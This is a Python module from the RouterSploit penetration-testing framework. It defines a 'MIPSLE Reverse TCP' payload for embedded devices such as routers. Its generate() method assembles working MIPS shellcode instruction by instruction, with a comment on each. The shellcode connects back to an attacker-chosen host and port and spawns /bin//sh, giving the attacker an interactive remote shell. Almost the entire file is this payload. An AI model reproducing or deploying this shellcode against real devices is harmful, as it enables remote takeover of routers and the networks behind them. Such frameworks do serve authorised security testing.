from routersploit.core.exploit import *
from routersploit.core.exploit.payloads import (
    ArchitectureSpecificPayload,
    Architectures,
    ReverseTCPPayloadMixin,
)


class Payload(ReverseTCPPayloadMixin, ArchitectureSpecificPayload):
    __info__ = {
        "name": "MIPSLE Reverse TCP",
        "description": "Creates interactive tcp reverse shell for MIPSLE architecture.",
        "authors": (
            "Marcin Bury <marcin[at]threat9.com>",  # routersploit module
        ),
    }

    architecture = Architectures.MIPSLE

    def generate(self):
        reverse_ip = utils.convert_ip(self.lhost)
        reverse_port = utils.convert_port(self.lport)

        return (
            b"\xff\xff\x04\x28" +            # slti    a0,zero,-1
            b"\xa6\x0f\x02\x24" +            # li      v0,4006
            b"\x0c\x09\x09\x01" +            # syscall 0x42424
            b"\x11\x11\x04\x28" +            # slti    a0,zero,4369
            b"\xa6\x0f\x02\x24" +            # li      v0,4006
            b"\x0c\x09\x09\x01" +            # syscall 0x42424
            b"\xfd\xff\x0c\x24" +            # li      t4,-3
            b"\x27\x20\x80\x01" +            # nor     a0,t4,zero
            b"\xa6\x0f\x02\x24" +            # li      v0,4006
            b"\x0c\x09\x09\x01" +            # syscall 0x42424
            b"\xfd\xff\x0c\x24" +            # li      t4,-3
            b"\x27\x20\x80\x01" +            # nor     a0,t4,zero
            b"\x27\x28\x80\x01" +            # nor     a1,t4,zero
            b"\xff\xff\x06\x28" +            # slti    a2,zero,-1
            b"\x57\x10\x02\x24" +            # li      v0,4183
            b"\x0c\x09\x09\x01" +            # syscall 0x42424
            b"\xff\xff\x44\x30" +            # andi    a0,v0,0xffff
            b"\xc9\x0f\x02\x24" +            # li      v0,4041
            b"\x0c\x09\x09\x01" +            # syscall 0x42424
            b"\xc9\x0f\x02\x24" +            # li      v0,4041
            b"\x0c\x09\x09\x01" +            # syscall 0x42424
            reverse_port + b"\x05\x3c" +     # "\x7a\x69" lui     a1,0x697a
            b"\x02\x00\xa5\x34" +            # ori     a1,a1,0x2
            b"\xf8\xff\xa5\xaf" +            # sw      a1,-8(sp)
            reverse_ip[2:] + b"\x05\x3c" +   # "\x00\x01" lui     a1,0x100
            reverse_ip[:2] + b"\xa5\x34" +   # "\x7f\x00" ori     a1,a1,0x7f
            b"\xfc\xff\xa5\xaf" +            # sw      a1,-4(sp)
            b"\xf8\xff\xa5\x23" +            # addi    a1,sp,-8
            b"\xef\xff\x0c\x24" +            # li      t4,-17
            b"\x27\x30\x80\x01" +            # nor     a2,t4,zero
            b"\x4a\x10\x02\x24" +            # li      v0,4170
            b"\x0c\x09\x09\x01" +            # syscall 0x42424
            b"\x62\x69\x08\x3c" +            # lui     t0,0x6962
            b"\x2f\x2f\x08\x35" +            # ori     t0,t0,0x2f2f
            b"\xec\xff\xa8\xaf" +            # sw      t0,-20(sp)
            b"\x73\x68\x08\x3c" +            # lui     t0,0x6873
            b"\x6e\x2f\x08\x35" +            # ori     t0,t0,0x2f6e
            b"\xf0\xff\xa8\xaf" +            # sw      t0,-16(sp)
            b"\xff\xff\x07\x28" +            # slti    a3,zero,-1
            b"\xf4\xff\xa7\xaf" +            # sw      a3,-12(sp)
            b"\xfc\xff\xa7\xaf" +            # sw      a3,-4(sp)
            b"\xec\xff\xa4\x23" +            # addi    a0,sp,-20
            b"\xec\xff\xa8\x23" +            # addi    t0,sp,-20
            b"\xf8\xff\xa8\xaf" +            # sw      t0,-8(sp)
            b"\xf8\xff\xa5\x23" +            # addi    a1,sp,-8
            b"\xec\xff\xbd\x27" +            # addiu   sp,sp,-20
            b"\xff\xff\x06\x28" +            # slti    a2,zero,-1
            b"\xab\x0f\x02\x24" +            # li      v0,4011
            b"\x0c\x09\x09\x01"              # syscall 0x42424
        )
